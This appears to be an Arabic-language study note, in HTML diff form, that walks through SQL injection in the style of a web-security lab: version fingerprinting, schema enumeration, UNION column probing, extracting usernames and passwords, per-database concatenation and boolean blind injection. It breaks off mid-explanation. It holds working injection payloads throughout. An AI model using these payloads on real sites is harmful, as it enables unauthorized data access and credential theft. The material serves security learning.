+<h3 id="examining-the-database-in-sql-injection-attacks">Examining the database in SQL injection attacks</h3>
+<h3 id="1">1. استعلامات معرفة نوع وإصدار قاعدة البيانات</h3>
+<p>يوضح الجدول في النص الأكواد (الاستعلامات) التي يمكن إرسالها لمعرفة نوع وإصدار القاعدة، وهي تختلف من نظام لآخر كالتالي:</p>
+<ul>
+<li>
+<p><strong>Microsoft SQL Server &amp; MySQL:</strong> نستخدم الكود <code>SELECT @@version</code></p>
+<ul>
+<li><strong>الشرح:</strong> هنا <code>@@version</code> عبارة عن "متغير نظام" (System Variable) مبني داخل قاعدة البيانات يحتفظ دائماً بمعلومات الإصدار. نحن نطلب من القاعدة ببساطة قراءة وطباعة قيمة هذا المتغير.</li>
+</ul>
+</li>
+<li>
+<p><strong>Oracle:</strong> نستخدم الكود <code>SELECT * FROM v$version</code></p>
+<ul>
+<li><strong>الشرح:</strong> نظام أوراكل لا يمتلك دالة أو متغيراً بسيطاً للإصدار، ولكنه يحتفظ بهذه المعلومات داخل جدول (أو View) افتراضي مخصص لبيانات النظام يسمى <code>v$version</code>. لذا نستخدم أمر <code>SELECT *</code> لاستدعاء وقراءة كل البيانات الموجودة داخل هذا الجدول.</li>
+</ul>
+</li>
+<li>
+<p><strong>PostgreSQL:</strong> نستخدم الكود <code>SELECT version()</code></p>
+<ul>
+<li><strong>الشرح:</strong> هنا نستخدم دالة (Function) جاهزة ومبنية داخل النظام تسمى <code>version()</code>. عند استدعائها، تقوم مباشرة بإرجاع معلومات الإصدار.</li>
+</ul>
+</li>
+</ul>
+<h3 id="2-the-payload">2. شرح كود الاستغلال العملي (The Payload)</h3>
+<p>يعطي النص مثالاً لكيفية دمج هذه الاستعلامات في هجوم حقيقي باستخدام تقنية (UNION Attack). الكود المذكور هو: <code>' UNION SELECT @@version--</code></p>
+<p>تعالى نفكك هذا الكود لنفهم كيف يعمل خطوة بخطوة:</p>
+<ol>
+<li>
+<p><strong>علامة الاقتباس الأحادية (<code>'</code>):</strong> تُستخدم لإنهاء أو "كسر" الاستعلام الأصلي المكتوب في الكود البرمجي للموقع. هذه العلامة تجعل ما بعدها قابلاً للاستقبال كأوامر جديدة.</p>
+</li>
+<li>
+<p><strong>أمر <code>UNION</code>:</strong> هو مُعامل (Operator) في قواعد البيانات يُستخدم لدمج نتائج استعلامين مختلفين معاً. هنا نحن ندمج الاستعلام الأصلي للموقع مع استعلامنا الخبيث الذي سنكتبه الآن.</p>
+</li>
+<li>
+<p><strong>الاستعلام الخبيث <code>SELECT @@version</code>:</strong> هذا هو الأمر الخاص بنا، وفيه نطلب من قاعدة البيانات إرجاع معلومات الإصدار (نحن هنا نخمن أو نستهدف قواعد بيانات Microsoft أو MySQL).</p>
+</li>
+<li>
+<p><strong>علامة التعليق (<code>--</code>):</strong> جزء بالغ الأهمية. هذه العلامة تخبر محرك قاعدة البيانات بـ "تجاهل" كل الكود البرمجي الذي يأتي بعد هذه النقطة. هذا يمنع حدوث أخطاء برمجية (Syntax Errors) بسبب بقايا كود الاستعلام الأصلي الذي كسرناه في الخطوة الأولى.</p>
+</li>
+</ol>
+<h3 id="3-output">3. تحليل النتيجة المرتجعة (Output)</h3>
+<p>عندما قام الخادم بتنفيذ الكود السابق بنجاح، قام بإرجاع النص التالي: <code>Microsoft SQL Server 2016 (SP2) (KB4052908) - 13.0.5026.0 (X64)...</code></p>
+<p><strong>ماذا تعني هذه النتيجة؟</strong></p>
+<ul>
+<li>
+<p>تؤكد لك أن الهجوم (UNION Attack) قد نجح بالفعل.</p>
+</li>
+<li>
+<p>تؤكد لك أن نوع قاعدة البيانات هو <strong>Microsoft SQL Server</strong>.</p>
+</li>
+</ul>
+<h3 id="listing-the-contents-of-the-database">Listing the contents of the database</h3>
+<h3 id="1-information-schema"><strong>1. ما هو الـ Information Schema؟</strong></h3>
+<ul>
+<li>
+<p><strong>المفهوم:</strong> هو عبارة عن قاعدة بيانات افتراضية (أو مجموعة من الـ Views) موجودة بشكل افتراضي داخل أغلب أنظمة إدارة قواعد البيانات (مثل MySQL، وPostgreSQL، وMicrosoft SQL Server).</p>
+</li>
+<li>
+<p><strong>الوظيفة:</strong> تعمل كـ "قاموس" أو دليل للنظام؛ فهي لا تحتوي على بيانات المستخدمين الفعلية، بل تحتوي على معلومات حول هيكل قاعدة البيانات نفسها (أسماء الجداول، أسماء الأعمدة، أنواع البيانات، صلاحيات المستخدمين).</p>
+</li>
+<li>
+<p><strong>استثناء:</strong> كما أشار النص، نظام <strong>Oracle</strong> هو الوحيد من الأنظمة الشهيرة الذي لا يستخدم <code>information_schema</code>، بل يستخدم جداول أخرى بديلة مثل <code>all_tables</code> و <code>all_tab_columns</code>.</p>
+</li>
+</ul>
+<h3 id="2-tables"><strong>2. الكود الأول: استخراج أسماء الجداول (Tables)</strong></h3>
+<p>الخطوة الأولى هي معرفة الجداول الموجودة داخل قاعدة البيانات لكي تحدد هدفك (مثل جدول المستخدمين).</p>
+<ul>
+<li>
+<p><strong>الكود:</strong> <code>SELECT * FROM information_schema.tables</code></p>
+</li>
+<li>
+<p><strong>الشرح:</strong> أنت تطلب من قاعدة البيانات قراءة وجلب كل البيانات <code>*</code> من جدول يُسمى <code>tables</code> والموجود داخل القاموس <code>information_schema</code>.</p>
+</li>
+<li>
+<p><strong>تحليل النتيجة (Output):</strong> عند تنفيذ الكود، أظهرت النتيجة وجود ثلاثة جداول في قاعدة البيانات: <code>Products</code>، و<code>Users</code>، و<code>Feedback</code>. كباحث أمني (Pentester)، عينك ستتجه فوراً إلى جدول <strong><code>Users</code></strong> لأنه الهدف الأثمن والذي يحتوي غالباً على كلمات المرور.</p>
+</li>
+</ul>
+<h3 id="3-columns"><strong>3. الكود الثاني: استخراج أسماء الأعمدة (Columns)</strong></h3>
+<p>الآن أنت تعرف اسم الجدول (<code>Users</code>)، لكنك لا تستطيع استخراج البيانات منه لأنك لا تعرف أسماء الأعمدة الموجودة بداخله (هل هي User و Pass؟ أم Username و Password؟ أم Email و Hash؟).</p>
+<ul>
+<li>
+<p><strong>الكود:</strong> <code>SELECT * FROM information_schema.columns WHERE table_name = 'Users'</code></p>
+</li>
+<li>
+<p><strong>الشرح:</strong> هنا تطلب جلب البيانات من جدول <code>columns</code> (الذي يحتوي على أسماء كل الأعمدة في كل الجداول)، ولكنك استخدمت شرط <code>WHERE</code> لتصفية النتائج بحيث يجلب لك <strong>فقط</strong> الأعمدة التي تنتمي إلى الجدول الذي اسمه <code>Users</code>.</p>
+</li>
+<li>
+<p><strong>تحليل النتيجة (Output):</strong> أظهرت النتيجة أن جدول المستخدمين يحتوي على ثلاثة أعمدة:</p>
+<ul>
+<li>
+<p><code>UserId</code> ونوع بياناته أرقام (<code>int</code>).</p>
+</li>
+<li>
+<p><code>Username</code> ونوع بياناته نصوص (<code>varchar</code>).</p>
+</li>
+<li>
+<p><code>Password</code> ونوع بياناته نصوص (<code>varchar</code>).</p>
+</li>
+</ul>
+</li>
+</ul>
+<h3 id="listing-the-contents-of-an-oracle-database">Listing the contents of an Oracle database</h3>
+<h3 id="1-tables-oracle"><strong>1. استخراج أسماء الجداول (Tables) في Oracle</strong></h3>
+<ul>
+<li>
+<p><strong>الكود:</strong> <code>SELECT * FROM all_tables</code></p>
+</li>
+<li>
+<p><strong>الشرح:</strong> بدلاً من الاستعلام من <code>information_schema.tables</code>، نقوم هنا بطلب جلب كل البيانات من جدول يُسمى <code>all_tables</code>. هذا الجدول في Oracle يحتوي على قائمة بكل الجداول التي يمتلك المستخدم الحالي صلاحية لرؤيتها أو الوصول إليها.</p>
+</li>
+</ul>
+<h3 id="2-columns-oracle"><strong>2. استخراج أسماء الأعمدة (Columns) في Oracle</strong></h3>
+<ul>
+<li>
+<p><strong>الكود:</strong> <code>SELECT * FROM all_tab_columns WHERE table_name = 'USERS'</code></p>
+</li>
+<li>
+<p><strong>الشرح:</strong> بدلاً من <code>information_schema.columns</code>، نستخدم هنا الجدول <code>all_tab_columns</code>. وكما فعلنا سابقاً، نستخدم شرط <code>WHERE</code> لتحديد اسم الجدول الذي نريد استخراج أعمدته.</p>
+</li>
+</ul>
+<p><strong>💡 ملاحظة تقنية هامة جداً (Pro Tip):</strong> هل لاحظت أن اسم الجدول في الكود الخاص بـ Oracle مكتوب بحروف كبيرة <strong><code>'USERS'</code></strong>، بينما في مثال الـ information_schema السابق كان مكتوباً هكذا <strong><code>'Users'</code></strong>؟</p>
+<p>هذا ليس خطأً مطبعياً! نظام Oracle يقوم افتراضياً بحفظ أسماء الجداول والأعمدة بحروف كبيرة (Uppercase). هذه المعلومة حساسة جداً أثناء كتابة أوامر الـ SQL Injection (الـ Payloads)، لأنك إذا كتبت <code>table_name = 'Users'</code> بحروف صغيرة في Oracle، فلن يجد الجدول وسيفشل الهجوم. يجب أن تتطابق حالة الأحرف (Case Sensitivity).</p>
+<hr />
+<h4 id="in-band-types">IN-BAND types :</h4>
+<p>1- Union-based</p>
+<h3 id="1-union-union-attack"><strong>1. ما هو هجوم الـ UNION (UNION Attack)؟</strong></h3>
+<p>أمر <code>UNION</code> في قواعد البيانات يُستخدم لدمج (ضم) نتائج استعلامين <code>SELECT</code> مختلفين ليظهرا كجدول واحد (Result Set) في النهاية.</p>
+<ul>
+<li><strong>كيف يتم الاستغلال؟</strong> إذا كان التطبيق يعرض نتائج الاستعلام الأصلي على الشاشة، يمكنك استخدام <code>UNION</code> لإضافة استعلامك الخبيث. التطبيق سيقوم بتنفيذ الاستعلام الأصلي، ثم ينفذ استعلامك أنت، ويعرض النتيجتين معاً أمامك.</li>
+</ul>
+<p><strong>القاعدتان الذهبيتان (Requirements):</strong> لكي ينجح أمر <code>UNION</code> ولا يُصدر الخادم خطأ (Error)، يجب تحقيق شرطين بصرامة:</p>
+<ol>
+<li>
+<p><strong>تطابق عدد الأعمدة:</strong> الاستعلام الأصلي واستعلامك الخبيث يجب أن يُرجعا نفس عدد الأعمدة (Columns).</p>
+</li>
+<li>
+<p><strong>توافق أنواع البيانات:</strong> نوع البيانات في كل عمود يجب أن يكون متوافقاً (مثلاً: إذا كان العمود الأول في الاستعلام الأصلي يعرض نصوصاً "String"، يجب أن يكون العمود الأول في استعلامك يعرض نصوصاً أيضاً).</p>
+</li>
+</ol>
+<p>لذلك، أول خطوة دائماً في هذا الهجوم هي <strong>معرفة عدد الأعمدة</strong> التي يطلبها الاستعلام الأصلي. النص يشرح طريقتين فعالتين لتحقيق ذلك:</p>
+<h3 id="order-by"><strong>الطريقة الأولى: استخدام <code>ORDER BY</code></strong></h3>
+<p>تعتمد هذه الطريقة على أمر <code>ORDER BY</code> الذي يُستخدم لترتيب النتائج بناءً على عمود معين. الجميل هنا أنك لست بحاجة لمعرفة اسم العمود، بل يمكنك استخدام "الرقم الدليلي" (Index) الخاص به.</p>
+<ul>
+<li>
+<p><strong>آلية العمل:</strong> تقوم بحقن أمر الترتيب وتجربة الأرقام تصاعدياً:</p>
+<p>SQL</p>
+<p><code>' ORDER BY 1--
+' ORDER BY 2--
+' ORDER BY 3--</code></p>
+</li>
+<li>
+<p><strong>كيف تعرف النتيجة؟</strong> ستستمر في زيادة الرقم حتى يظهر لك خطأ (Error) في الصفحة، أو تختفي النتائج، أو تلاحظ أي تغيير غير طبيعي في استجابة السيرفر.</p>
+</li>
+<li>
+<p><strong>المعنى:</strong> إذا جربت <code>ORDER BY 3</code> وعملت الصفحة بنجاح، ثم جربت <code>ORDER BY 4</code> وظهر خطأ يخبرك أن "العمود رقم 4 غير موجود" (Out of range)، فهذا يعني أن الاستعلام الأصلي يحتوي على <strong>3 أعمدة فقط</strong>.</p>
+</li>
+</ul>
+<h3 id="union-select-null"><strong>الطريقة الثانية: استخدام <code>UNION SELECT NULL</code></strong></h3>
+<p>تعتمد هذه الطريقة على المحاولة والخطأ المباشر باستخدام أمر <code>UNION</code> نفسه، ولكن مع استخدام قيمة <code>NULL</code> (فارغ).</p>
+<ul>
+<li>
+<p><strong>آلية العمل:</strong> تقوم بإرسال أعمدة فارغة وتزيد عددها في كل مرة:</p>
+<p>SQL</p>
+<p><code>' UNION SELECT NULL--
+' UNION SELECT NULL,NULL--
+' UNION SELECT NULL,NULL,NULL--</code></p>
+</li>
+<li>
+<p><strong>كيف تعرف النتيجة؟</strong> ستستمر الصفحة بإعطاء خطأ (لأن عدد الأعمدة غير متطابق) حتى تصل إلى العدد الصحيح. عندما يتطابق عدد الـ <code>NULLs</code> مع عدد الأعمدة الأصلي، سيختفي الخطأ، وقد تلاحظ ظهور صف (Row) إضافي فارغ في نتائج الصفحة (مثلاً صف فارغ في جدول HTML).</p>
+</li>
+<li>
+<p><strong>لماذا نستخدم <code>NULL</code> تحديداً؟</strong> هنا تكمن العبقرية؛ تذكر "القاعدة الذهبية الثانية" (توافق أنواع البيانات). إذا حاولت استخدام أرقام أو نصوص عشوائية لاكتشاف العدد، قد تفشل العملية بسبب تعارض أنواع البيانات (Data type mismatch) حتى لو كان العدد صحيحاً. لكن <code>NULL</code> تعمل كـ "الجوكر"، فهي متوافقة مع جميع أنواع البيانات تقريباً (نصوص، أرقام، تواريخ). استخدام <code>NULL</code> يضمن لك التركيز فقط على اكتشاف "العدد" دون القلق من "نوع البيانات".</p>
+</li>
+</ul>
+<p><strong>الخلاصة:</strong> أنت الآن تستخدم الطريقتين كـ "مجسّات" لاكتشاف هيكل الاستعلام المخفي في الـ Back-end. بمجرد أن تكتشف أن الاستعلام يحتوي على (3 أعمدة مثلاً)، تنتقل للخطوة التالية وهي تحديد أي من هذه الأعمدة يقبل النصوص لكي تحقن فيه الأوامر التي ستستخرج كلمات المرور أو البيانات الحساسة.</p>
+<hr />
+<h3 id="database-specific-syntax">Database-specific syntax :</h3>
+<h3 id="1-database-specific-syntax"><strong>1. الفروق في صيغ قواعد البيانات (Database-specific syntax)</strong></h3>
+<p>كل محرك قاعدة بيانات له قواعده الخاصة (Syntax) التي يجب احترامها لكي يعمل كود الاستغلال (Payload) بشكل صحيح:</p>
+<ul>
+<li>
+<p><strong>حالة Oracle (استخدام جدول DUAL):</strong> في أنظمة قواعد البيانات العادية، يمكنك كتابة <code>SELECT NULL</code> وسيعمل الأمر ببساطة. لكن في <strong>Oracle</strong>، هناك قاعدة صارمة: <em>أي استعلام <code>SELECT</code> يجب أن يحتوي على أمر <code>FROM</code> واسم جدول</em>. لحل هذه المشكلة، توفر Oracle جدولاً وهمياً أو افتراضياً مبنياً داخل النظام يُسمى <strong><code>DUAL</code></strong>. لذلك، إذا اكتشفت أن الهدف يعمل بـ Oracle، يجب أن تعدل كود اكتشاف عدد الأعمدة ليصبح هكذا: <code>' UNION SELECT NULL FROM DUAL--</code></p>
+</li>
+<li>
+<p><strong>حالة MySQL (قواعد التعليقات):</strong> علامة التعليق <code>--</code> هي المعيار السائد لتجاهل باقي الكود، لكن في <strong>MySQL</strong> هناك شرط دقيق جداً (ودائماً ما يقع فيه المبتدئون): يجب أن يكون هناك <strong>مسافة (Space)</strong> بعد الشرطتين لكي يتم التعرف عليها كتعليق. البديل الأسهل في MySQL هو استخدام علامة الهاشتاج <strong><code>#</code></strong>، فهي تعمل كتعليق مباشر بدون الحاجة لمسافات.</p>
+</li>
+</ul>
+<h3 id="2-finding-columns-with-a-useful-data-type"><strong>2. البحث عن عمود يقبل النصوص (Finding columns with a useful data type)</strong></h3>
+<p>الهدف الرئيسي من الهجوم هو استخراج بيانات حساسة (مثل أسماء المستخدمين أو كلمات المرور)، وهذه البيانات تكون دائماً في شكل <strong>نصوص (Strings)</strong>. المشكلة أنك لا تستطيع حقن نصوص في عمود مخصص للأرقام (Integer) أو التواريخ (Date) وإلا سيحدث خطأ.</p>
+<p><strong>كيف نكتشف العمود الذي يقبل النصوص؟</strong> بما أننا استخدمنا <code>NULL</code> في الخطوة السابقة (لأن <code>NULL</code> متوافقة مع كل أنواع البيانات)، سنبدأ الآن باستبدال هذه الـ <code>NULLs</code> بنص بسيط (مثل حرف <code>'a'</code>) بشكل تدريجي وفي عمود واحد في كل مرة.</p>
+<p>لنفترض أنك اكتشفت أن الاستعلام يحتوي على 4 أعمدة، ستقوم بتجربة هذه الأكواد بالترتيب:</p>
+<p>SQL</p>
+<pre><code>' UNION SELECT 'a',NULL,NULL,NULL--  (اختبار العمود الأول)
+' UNION SELECT NULL,'a',NULL,NULL--  (اختبار العمود الثاني)
+' UNION SELECT NULL,NULL,'a',NULL--  (اختبار العمود الثالث)
+' UNION SELECT NULL,NULL,NULL,'a'--  (اختبار العمود الرابع)
+</code></pre>
+<p><strong>كيف تحلل النتيجة؟</strong></p>
+<ul>
+<li>
+<p><strong>ظهور خطأ (Error):</strong> إذا رد الخادم برسالة خطأ مثل: <code>Conversion failed when converting the varchar value 'a' to data type int</code>، فهذا يعني أن هذا العمود مخصص للأرقام (int) ولا يقبل النصوص. إذن، هذا العمود غير مفيد لنا.</p>
+</li>
+<li>
+<p><strong>نجاح العملية (Success):</strong> إذا لم يظهر خطأ، ورأيت حرف <code>'a'</code> مطبوعاً أمامك على شاشة الموقع (مثلاً داخل جدول أو في مكان تعليق)، <strong>فهذا هو المطلوب!</strong> لقد وجدت العمود المناسب لاستخراج البيانات.</p>
+</li>
+</ul>
+<p><strong>الخطوة النهائية (ما بعد هذا النص):</strong> بمجرد أن تعرف أن العمود الثاني (على سبيل المثال) يقبل النصوص، ستقوم باستبدال حرف <code>'a'</code> باسم العمود الذي تريد سرقته (مثل <code>username</code> أو <code>password</code>) من الجدول الذي استكشفته سابقاً!</p>
+<hr />
+<h3 id="using-a-sql-injection-union-attack-to-retrieve-interesting-data">Using a SQL injection UNION attack to retrieve interesting data :</h3>
+<h3 id="1_1"><strong>1. متى يمكنك استخراج البيانات؟</strong></h3>
+<p>يخبرك النص أنك جاهز لتنفيذ هذه الخطوة فقط إذا تمكنت من تحديد أمرين:</p>
+<ul>
+<li>
+<p>عرفت بالضبط <strong>عدد الأعمدة</strong> التي يُرجعها الاستعلام الأصلي.</p>
+</li>
+<li>
+<p>حددت أي من هذه الأعمدة <strong>يقبل إدخال نصوص (String Data)</strong> لكي تحقن فيه بياناتك.</p>
+</li>
+</ul>
+<h3 id="2_1"><strong>2. السيناريو الافتراضي للاستغلال</strong></h3>
+<p>يفترض النص سيناريو تطبيقياً بناءً على ما اكتشفته باستخدام الخطوات السابقة:</p>
+<ul>
+<li>
+<p>الاستعلام الأصلي يُرجع عمودين، وكلاهما متوافق مع النصوص.</p>
+</li>
+<li>
+<p>نقطة الحقن موجودة داخل جملة <code>WHERE</code> محاطة بعلامات تنصيص أحادية (<code>'</code>).</p>
+</li>
+<li>
+<p>أنت تعرف مسبقاً (بفضل استكشافك لـ <code>information_schema</code>) أن هناك جدول في القاعدة يُسمى <code>users</code> يحتوي على عمودين باسم <code>username</code> و <code>password</code>.</p>
+</li>
+</ul>
+<h3 id="3-the-payload"><strong>3. كود الاستغلال النهائي (The Payload)</strong></h3>
+<p>بناءً على المعطيات السابقة، ستقوم بإرسال هذا الكود للحصول على البيانات: <code>' UNION SELECT username, password FROM users--</code></p>
+<p><strong>ماذا يحدث في الخلفية عند تنفيذ هذا الكود؟</strong></p>
+<ul>
+<li>
+<p><strong><code>'</code></strong>: تنهي (تكسر) الاستعلام الأصلي المكتوب داخل كود التطبيق.</p>
+</li>
+<li>
+<p><strong><code>UNION SELECT</code></strong>: تدمج النتيجة الأصلية للتطبيق مع نتيجة استعلامك الخبيث.</p>
+</li>
+<li>
+<p><strong><code>username, password</code></strong>: تطلب جلب قيم أسماء المستخدمين وكلمات المرور. (لاحظ أننا استدعينا "عمودين" فقط، مما يتطابق مع الاستعلام الأصلي، وبما أن القيم نصوص، فهي تتطابق مع نوع البيانات المقبول).</p>
+</li>
+<li>
+<p><strong><code>FROM users</code></strong>: تحدد اسم الجدول الذي يحتوي على الهدف.</p>
+</li>
+<li>
+<p><strong><code>--</code></strong>: تحول باقي الاستعلام الأصلي إلى تعليق (Comment) ليتم تجاهله وتجنب حدوث أي <code>Syntax Error</code>.</p>
+</li>
+</ul>
+<hr />
+<h3 id="retriving-multiple-values-within-a-single-column">Retriving multiple values within a single column:</h3>
+<p>هذا السيناريو يمثل حيلة ذكية جداً (Trick) بنلجأ إليها في اختبار الاختراق عندما نواجه قيداً أو تحديداً (Constraint) في الصفحة المستهدفة.</p>
+<p>في الخطوات السابقة، كنا نفترض أن الاستعلام الأصلي يرجع عمودين أو أكثر يقبلون النصوص، فكنّا نضع <code>Username</code> في عمود و <code>Password</code> في العمود الثاني. لكن ماذا لو كشفت مرحلة الفحص (Probing) أن الاستعلام الأصلي لا يرجع سوى <strong>عمود واحد فقط</strong> يقبل النصوص؟ هنا تظهر المشكلة: كيف نسحب قيمتين (الاسم وكلمة المرور) وتطبيق الويب لا يسمح لنا بعرض إلا قيمة واحدة في كل صف؟</p>
+<p>الحل هو <strong>دمج النصوص (String Concatenation)</strong>، وإليك شرح الفكرة والأكواد بالتفصيل:</p>
+<h3 id="1-concatenation"><strong>1. فكرة دمج النصوص (Concatenation)</strong></h3>
+<p>بدلاً من طلب الاسم وكلمة المرور كعمودين منفصلين، نقوم بدمجهما معاً برمجياً داخل قاعدة البيانات ليصبحوا "نصاً واحداً كبيراً"، وبالتالي يتم تمريرهم داخل هذا العمود الوحيد المتاح لنا.</p>
+<p>للفصل بين الكلمتين وحتى لا تلتصق كلمة المرور باسم المستخدم (مثل: <code>administrators3cure</code>) فيصعب عليك التفريق بينهما، نقوم بحقن <strong>علامة فاصلة (Separator)</strong> في المنتصف، مثل علامة التِلْدة (<code>~</code>) أو النقطتين فوق بعضهما (<code>:</code>).</p>
+<h3 id="2-oracle"><strong>2. شرح كود الاستغلال في Oracle</strong></h3>
+<p>الكود المستخدم في المثال هو: <code>' UNION SELECT username || '~' || password FROM users--</code></p>
+<p>تعال نفكك هذا الكود برمجياً:</p>
+<ul>
+<li>
+<p><strong><code>'</code></strong>: كسر الاستعلام الأصلي كالمعتاد.</p>
+</li>
+<li>
+<p><strong><code>UNION SELECT</code></strong>: أمر دمج استعلامنا مع الاستعلام الأصلي.</p>
+</li>
+<li>
+<p><strong><code>||</code> (Double-pipe):</strong> هذا هو معامل الدمج (Concatenation Operator) <strong>الخاص بقاعدة بيانات Oracle تحديداً</strong>. وظيفته ربط النصوص ببعضها.</p>
+</li>
+<li>
+<p><strong><code>'~'</code></strong>: هذا هو الفاصل الذي اخترناه. وضعناه بين علامات تنصيص مفردة لأنه نص ثابت (String Literal).</p>
+</li>
+<li>
+<p><strong><code>FROM users--</code></strong>: جلب البيانات من جدول المستخدمين، وعلامة التعليق لإنهاء الكود.</p>
+</li>
+</ul>
+<p><strong>كيف يقرأ محرك Oracle هذا الأمر؟</strong> المحرك سيذهب لجدول <code>users</code> ويأتي بأول اسم مستخدم (مثلاً <code>administrator</code>) ثم يربطه بـ <code>~</code> ثم يربطه بكلمة المرور الخاصة به (مثلاً <code>s3cure</code>)، فيتحول الناتج بالكامل في الخلفية إلى نص واحد: <code>administrator~s3cure</code>. هذا النص يملأ العمود الوحيد المتاح ويظهر على الشاشة بنجاح.</p>
+<h3 id="3-output_1"><strong>3. تحليل النتيجة المرتجعة (Output)</strong></h3>
+<p>عند نجاح الهجوم، ستظهر لك النتائج على الموقع بهذا الشكل:</p>
+<p>Plaintext</p>
+<pre><code>administrator~s3cure
+wiener~peter
+carlos~montoya
+</code></pre>
+<p>بصفتك المهاجم، كل ما عليك فعله الآن هو أخذ هذه النصوص وفصلها يدوياً أو باستخدام سكريبت بايثون بسيط عند علامة <code>~</code> لتقسيمها إلى أسماء مستخدمين وكلمات مرور جاهزة للاستخدام.</p>
+<h3 id="_1"><strong>💡 تلميحة تقنية مهمة (فروق صيغ قواعد البيانات الأخرى):</strong></h3>
+<p>النص أشار في النهاية إلى أن صيغة الدمج تختلف من قاعدة بيانات لأخرى. إذا كنت تطبق هذا الهجوم على قواعد بيانات غير Oracle، ستختلف المعاملات كالتالي:</p>
+<ul>
+<li>
+<p><strong>MySQL:</strong> لا تفهم الـ <code>||</code> (إلا لو تم تغيير الإعدادات)، والبديل هو استخدام دالة <code>CONCAT</code>: <code>' UNION SELECT CONCAT(username, '~', password) FROM users--</code></p>
+</li>
+<li>
+<p><strong>PostgreSQL:</strong> تستخدم نفس معامل Oracle تماماً وهو <code>||</code>: <code>' UNION SELECT username || '~' || password FROM users--</code></p>
+</li>
+<li>
+<p><strong>Microsoft SQL Server:</strong> تستخدم علامة الجمع العادية <code>+</code> لدمج النصوص: <code>' UNION SELECT username + '~' + password FROM users--</code></p>
+</li>
+</ul>
+<p>هذه الحيلة تضمن لك تخطي عقبة "العمود الواحد" واختصار الوقت بجلب البيانات كلها دفعة واحدة!</p>
+<hr />
+<h3 id="blind-sql-injection">Blind sql injection :</h3>
+<p>هنا ننتقل إلى واحد من أجمل وأكثر المواضيع تشويقاً في اختبار الاختراق، وهو <strong>الحقن الأعمى (Blind SQL Injection)</strong>، وتحديداً النوع المعتمد على <strong>الاستجابات المشروطة (Boolean-based Blind SQLi)</strong>.</p>
+<p>في هذا السيناريو، يتذاكى المطور ويقوم بإخفاء الأخطاء ومنع عرض البيانات المستخرجة على الشاشة، ظناً منه أنه هكذا قد حمى الموقع. لكن هذا النص يشرح كيف يمكن للمهاجم الذكي أن يجبر الموقع على الإجابة بـ "نعم" أو "لا" عبر تتبع التغيرات في استجابة الصفحة، وبالتالي سحب البيانات حرفاً بحرف.</p>
+<p>إليك الشرح المفصل والعميق للنص والأكواد المذكورة فيه:</p>
+<h3 id="1-blind-sqli-union"><strong>1. ما هو الحقن الأعمى (Blind SQLi) ولماذا يفشل الـ UNION هنا؟</strong></h3>
+<ul>
+<li>
+<p><strong>المفهوم:</strong> يحدث الحقن الأعمى عندما يكون الموقع مصاباً بالثغرة وقاعدة البيانات تنفذ الأوامر بالفعل، ولكن <strong>النتائج لا تظهر على الشاشة</strong>، ولا تظهر أي رسائل خطأ تفصيلية (Database Errors). أنت هنا تعمل في الظلام.</p>
+</li>
+<li>
+<p><strong>فشل UNION:</strong> هجمات الـ <code>UNION</code> التي شرحناها سابقاً تعتمد كلياً على أن البيانات المستخرجة سيتم طباعتها داخل الصفحة لكي تراها. في حالة الـ Blind، بما أن الصفحة لا تعرض شيئاً، فإن الـ <code>UNION</code> يصبح غير فعال، ونحتاج لتقنية أخرى.</p>
+</li>
+</ul>
+<h3 id="2-conditional-responses"><strong>2. سيناريو الاستغلال عبر الاستجابة المشروطة (Conditional Responses)</strong></h3>
+<p>يفترض النص وجود موقع يستخدم ملف تعريف ارتباط (Cookie) لتتبع المستخدمين اسمه <code>TrackingId</code>. عندما ترسل الطلب للموقع، يأخذ السيرفر قيمة الـ Cookie ويضعها في هذا الاستعلام:</p>
+<p>SQL</p>
+<pre><code>SELECT TrackingId FROM TrackedUsers WHERE TrackingId = 'u5YD3PapBcR4lN3e7Tj4'
+</code></pre>
+<p><strong>سلوك الموقع (The Behavior):</strong></p>
+<ul>
+<li>
+<p>إذا كانت قيمة الـ <code>TrackingId</code> صحيحة وموجودة في القاعدة، يطبع الموقع جملة: <strong>"Welcome back"</strong>.</p>
+</li>
+<li>
+<p>إذا كانت القيمة خاطئة أو غير موجودة، <strong>تختفي</strong> جملة "Welcome back".</p>
+</li>
+</ul>
+<p>هذا الاختلاف البسيط (ظهور واختفاء الكلمة) هو القناة التي سنتحدث من خلالها مع قاعدة البيانات!</p>
+<h3 id="3-logic-probing"><strong>3. شرح أكواد اختبار المنطق (Logic Probing)</strong></h3>
+<p>للتأكد من أننا نستطيع التحكم في استجابة الموقع بناءً على شروطنا، نقوم بحقن الكودين التاليين:</p>
+<ul>
+<li>
+<p><strong>الكود الأول:</strong> <code>…xyz' AND '1'='1</code></p>
+<ul>
+<li>
+<p><strong>الشرح:</strong> علامة الاقتباس تكسر الاستعلام، ثم أضفنا شرطاً منطقياً <code>AND '1'='1'</code> وهو شرط <strong>صحيح دائماً (True)</strong>.</p>
+</li>
+<li>
+<p><strong>النتيجة في الخلفية:</strong> الاستعلام بالكامل يصبح صحيحاً، وبالتالي ستظهر جملة <strong>"Welcome back"</strong>.</p>
+</li>
+</ul>
+</li>
+<li>
+<p><strong>الكود الثاني:</strong> <code>…xyz' AND '1'='2</code></p>
+<ul>
+<li>
+<p><strong>الشرح:</strong> هنا وضعنا شرطاً <strong>خاطئاً دائماً (False)</strong> وهو أن 1 تساوي 2.</p>
+</li>
+<li>
+<p><strong>النتيجة في الخلفية:</strong> بما أننا استخدمنا <code>AND</code> (والتي تتطلب أن يكون الطرفان صحيحين)، فإن الشرط الخاطئ يعطل الاستعلام بالكامل، وبالتالي <strong>ستختفي</strong> جملة "Welcome back".</p>
+</li>
+</ul>
+</li>
+</ul>
+<p>بمجرد رؤيتك لهذا التغيير، تأكدت 100% أن الموقع مصاب بـ <strong>Boolean-based Blind SQLi</strong>، وأنك تستطيع طرح أي سؤال على قاعدة البيانات؛ فإذا ظهرت الجملة فالإجابة "نعم"، وإذا اختفت فالإجابة "لا".</p>
+<h3 id="4-data-extraction"><strong>4. شرح أكواد استخراج البيانات (Data Extraction)</strong></h3>
+<p>الآن نريد سحب كلمة مرور مدير النظام (Administrator) من جدول الـ <code>Users</code>. وبما أننا لا نستطيع رؤيتها دفعة واحدة، سنقوم بتخمينها <strong>حرفاً بحرف</strong> باستخدام دالة <strong><code>SUBSTRING</code></strong>.</p>
+<h4 id="substring"><strong>فهم دالة <code>SUBSTRING</code> أولاً:</strong></h4>
+<p>الدالة تأخذ ثلاثة أشياء: <code>SUBSTRING(النص المراد تقطيعه, رقم الحرف الذي سنبدأ من عنده, عدد الحروف المراد قطعها)</code>. مثال: لو كانت كلمة المرور هي <code>secret</code>:</p>
+<ul>
+<li>
